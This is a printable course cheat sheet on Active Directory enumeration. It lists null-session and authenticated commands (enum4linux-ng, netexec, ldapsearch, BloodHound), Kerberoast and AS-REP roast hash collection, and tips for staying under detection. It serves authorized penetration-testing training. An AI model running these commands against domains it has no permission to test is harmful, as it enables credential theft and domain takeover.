# Cheat sheet — AD Enumeration

*Companion to [Module 02 — Enumeration](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## First pass — what the domain gives away for free

Run this *before* you have credentials. Null sessions and guest access are common.

```bash
enum4linux-ng -A dc01.corp.local              # -A = all: RPC, SMB, LDAP, users, shares, policy
enum4linux-ng -A -u '' -p '' 10.10.0.10       # explicit null session (anonymous bind)
nxc smb 10.10.0.10 -u '' -p ''                # is the anonymous/guest session open?
nxc smb 10.10.0.10 -u guest -p ''             # guest with empty password
rpcclient -U '' -N 10.10.0.10                 # interactive null RPC (then: enumdomusers, querydominfo)
```

## LDAP with ldapsearch — raw and precise

```bash
# Anonymous / simple bind (-x). -H = URI, -b = search base, -D = bind DN, -w = password.
ldapsearch -x -H ldap://10.10.0.10 -b "dc=corp,dc=local" -D "corp\jsmith" -w 'Welcome1!' \
  "(objectClass=user)" sAMAccountName

# All users
ldapsearch ... "(sAMAccountName=*)" sAMAccountName
# All groups
ldapsearch ... "(objectClass=group)" cn member
# Accounts with an SPN → Kerberoast targets
ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
# AS-REP roastable (DONT_REQ_PREAUTH = bit 0x400000 in userAccountControl)
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
# Unconstrained delegation (TRUSTED_FOR_DELEGATION = 0x80000)
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```

The `1.2.840.113556.1.4.803` OID is the bitwise-AND matching rule — memorise it, it is how you
filter on `userAccountControl` flags.

## netexec (nxc) — enumerate at scale

```bash
nxc smb 10.10.0.0/24                          # sweep: alive hosts, OS, hostname, domain, signing
nxc smb 10.10.0.10 -u jsmith -p 'Welcome1!' --users     # domain users via SMB
nxc smb 10.10.0.10 -u jsmith -p 'Welcome1!' --groups    # domain groups
nxc smb 10.10.0.10 -u jsmith -p 'Welcome1!' --shares    # readable/writable shares
nxc smb 10.10.0.10 -u jsmith -p 'Welcome1!' --pass-pol  # password policy (lockout threshold!)
nxc ldap 10.10.0.10 -u jsmith -p 'Welcome1!' --kerberoasting kerb.txt  # roast + save hashes
nxc ldap 10.10.0.10 -u jsmith -p 'Welcome1!' --asreproast asrep.txt
```

## BloodHound — graph the paths

```bash
# Python ingestor from a Linux attacker box. -c All collects every method.
bloodhound-python -d corp.local -u jsmith -p 'Welcome1!' -c All -ns 10.10.0.10 \
  --zip                                       # emits a timestamped .zip of JSON, ready to import

# Then: start BloodHound CE (docker compose up), upload the .zip in the UI, and query.
```

SharpHound is the Windows/C# collector equivalent — run `SharpHound.exe -c All` from a domain host
when you have execution on Windows rather than a Linux foothold.

Useful Cypher, run in the BloodHound UI after import:

```cypher
// Shortest paths from a starting user to Domain Admins
MATCH p=shortestPath((u:User {name:"JSMITH@CORP.LOCAL"})-[*1..]->(g:Group)) 
WHERE g.name STARTS WITH "DOMAIN ADMINS" RETURN p
```

Verify any AI-generated Cypher against the raw JSON — models invent edge types that don't exist.

## Gotchas worth remembering

- **Run the unauthenticated pass first.** enum4linux-ng against a null/guest session often hands you
  users, shares, and password policy before you spend a credential — skip it and you miss the free win.
- **The UAC bit filter is exact, not fuzzy.** `4194304` = `DONT_REQ_PREAUTH`, `524288` = unconstrained
  delegation, `8192` = a domain controller. Wrong decimal, wrong (or empty) results — no error.
- **Enumeration is loud by volume, not by content.** SharpHound/`-c All` fires thousands of LDAP
  queries; on a monitored domain that's the Event 1644 spike that gets you caught. `--stealth` or a
  narrower collection method trades completeness for quiet.
- **`ldapsearch` needs the right base DN.** `dc=corp,dc=local` for `corp.local`; get it wrong and every
  query returns nothing. Pull it from `enum4linux-ng` or a `namingContexts` query on the RootDSE first.
- **BloodHound reads, it doesn't exploit.** Every edge SharpHound collects is normal LDAP/SMB a legit
  user is allowed to make — the graph is the insight, not the intrusion. Detection is on the pattern.
